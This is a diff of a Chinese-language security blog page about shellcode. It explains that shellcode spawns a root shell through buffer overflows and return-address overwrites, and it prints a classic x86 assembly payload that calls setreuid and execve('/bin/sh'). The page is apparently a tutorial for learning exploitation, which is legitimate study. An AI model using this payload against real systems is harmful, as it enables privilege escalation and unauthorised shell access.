@@ -6,16 +6,16 @@
   
   <title>shell code | PlayDumb</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="Shellcode:The PayloadSHELLCODE​		为了直接在堆栈或内存的其他部分执行我们处理二进制的原始漏洞利用代码，我们需要表示目标机器的一组原始机器指令的汇编代码。 shellcode 是一种汇编语言程序，它执行一个 shell，例如 Unix&#x2F;Linuxshell 的“&#x2F;bin&#x2F;sh”，或 DOS 和 MicrosoftWindows 上的 co">
+  <meta name="description" content="Shellcode:The PayloadSHELLCODE​		为了直接在堆栈或内存的其他部分执行我们处理二进制的原始漏洞利用代码，我们需要表示目标机器的一组原始机器指令的汇编代码。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="shell code">
 <meta property="og:url" content="http://example.com/2021/10/11/BO9-shellcode/index.html">
 <meta property="og:site_name" content="PlayDumb">
-<meta property="og:description" content="Shellcode:The PayloadSHELLCODE​		为了直接在堆栈或内存的其他部分执行我们处理二进制的原始漏洞利用代码，我们需要表示目标机器的一组原始机器指令的汇编代码。 shellcode 是一种汇编语言程序，它执行一个 shell，例如 Unix&#x2F;Linuxshell 的“&#x2F;bin&#x2F;sh”，或 DOS 和 MicrosoftWindows 上的 co">
+<meta property="og:description" content="Shellcode:The PayloadSHELLCODE​		为了直接在堆栈或内存的其他部分执行我们处理二进制的原始漏洞利用代码，我们需要表示目标机器的一组原始机器指令的汇编代码。">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow5_files/image001.png">
 <meta property="article:published_time" content="2021-10-10T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-08-17T02:22:55.679Z">
+<meta property="article:modified_time" content="2022-08-17T03:53:18.758Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
@@ -102,7 +102,10 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="Shellcode-The-Payload"><a href="#Shellcode-The-Payload" class="headerlink" title="Shellcode:The Payload"></a>Shellcode:The Payload</h1><h2 id="SHELLCODE"><a href="#SHELLCODE" class="headerlink" title="SHELLCODE"></a>SHELLCODE</h2><p>​		为了直接在堆栈或内存的其他部分执行我们处理二进制的原始漏洞利用代码，我们需要表示目标机器的一组原始机器指令的汇编代码。 shellcode 是一种汇编语言程序，它执行一个 shell，例如 Unix&#x2F;Linuxshell 的“&#x2F;bin&#x2F;sh”，或 DOS 和 MicrosoftWindows 上的 command.com shell。 在 <a target="_blank" rel="noopener" href="https://www.learnshell.org/">learnshell.org</a> 上以交互方式尝试 shell 命令。 请记住，在exploit中，不仅仅是一个普通的shell，我们想要的是root shell或管理员权限（注意：在某些情况下，在Windows中存在具有高于管理员权限的帐户，例如LocalSystem）。 Shellcode 用于生成（root）shell，因为它会给我们最高权限。 Shellcode 可用作漏洞利用有效载荷，为黑客或攻击者提供对计算机系统的命令行访问。 Shellcode 通常通过利用基于堆栈或堆的缓冲区溢出漏洞或格式字符串攻击来注入计算机内存。 在经典和正常的漏洞利用中，可以通过用注入的 shellcode 的地址覆盖堆栈返回地址来触发 shellcode 执行。 结果，子程序返回给调用者，而是返回到 shellcode，生成一个 shell。 shellcode 的例子可能有以下几种形式：</p>
+        <h1 id="Shellcode-The-Payload"><a href="#Shellcode-The-Payload" class="headerlink" title="Shellcode:The Payload"></a>Shellcode:The Payload</h1><h2 id="SHELLCODE"><a href="#SHELLCODE" class="headerlink" title="SHELLCODE"></a>SHELLCODE</h2><p>​		为了直接在堆栈或内存的其他部分执行我们处理二进制的原始漏洞利用代码，我们需要表示目标机器的一组原始机器指令的汇编代码。 </p>
+<span id="more"></span>
+
+<p>shellcode 是一种汇编语言程序，它执行一个 shell，例如 Unix&#x2F;Linuxshell 的“&#x2F;bin&#x2F;sh”，或 DOS 和 MicrosoftWindows 上的 command.com shell。 在 <a target="_blank" rel="noopener" href="https://www.learnshell.org/">learnshell.org</a> 上以交互方式尝试 shell 命令。 请记住，在exploit中，不仅仅是一个普通的shell，我们想要的是root shell或管理员权限（注意：在某些情况下，在Windows中存在具有高于管理员权限的帐户，例如LocalSystem）。 Shellcode 用于生成（root）shell，因为它会给我们最高权限。 Shellcode 可用作漏洞利用有效载荷，为黑客或攻击者提供对计算机系统的命令行访问。 Shellcode 通常通过利用基于堆栈或堆的缓冲区溢出漏洞或格式字符串攻击来注入计算机内存。 在经典和正常的漏洞利用中，可以通过用注入的 shellcode 的地址覆盖堆栈返回地址来触发 shellcode 执行。 结果，子程序返回给调用者，而是返回到 shellcode，生成一个 shell。 shellcode 的例子可能有以下几种形式：</p>
 <p>作为汇编语言 - shellcode.s（shellcode.asm - 适用于 Windows）：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#a very simple assembly (AT&amp;T/Linux) program for spawning a shell</span><br><span class="line">.section .data</span><br><span class="line">.section .text</span><br><span class="line">.globl _start</span><br><span class="line">_start:</span><br><span class="line">         xor %eax, %eax</span><br><span class="line">         mov $70, %al          #setreuid is syscall 70</span><br><span class="line">         xor %ebx, %ebx</span><br><span class="line">         xor %ecx, %ecx</span><br><span class="line">        int $0x80</span><br><span class="line">         jmp ender</span><br><span class="line">         starter:</span><br><span class="line">        popl %ebx             #get the address of the string</span><br><span class="line">         xor  %eax, %eax</span><br><span class="line">         mov  %al, 0x07(%ebx)  #put a NULL where the N is in the string</span><br><span class="line">         movl %ebx, 0x08(%ebx) #put the address of the string</span><br><span class="line">                                #to where the AAAA is</span><br><span class="line">         movl %ebx, 0x0c(%ebx) #put 4 null bytes into where the BBBB is</span><br><span class="line">         mov $11, %al          #execve is syscall 11</span><br><span class="line">         lea 0x08(%ebx), %ecx  #load the address of where the AAAA was</span><br><span class="line">         lea 0x0c(%ebx), %edx  #load the address of the NULLS</span><br><span class="line">         int $0x80             #call the kernel</span><br><span class="line">ender:</span><br><span class="line">         call starter</span><br><span class="line">         .string &quot;/bin/shNAAAABBBB&quot;</span><br></pre></td></tr></table></figure>
 
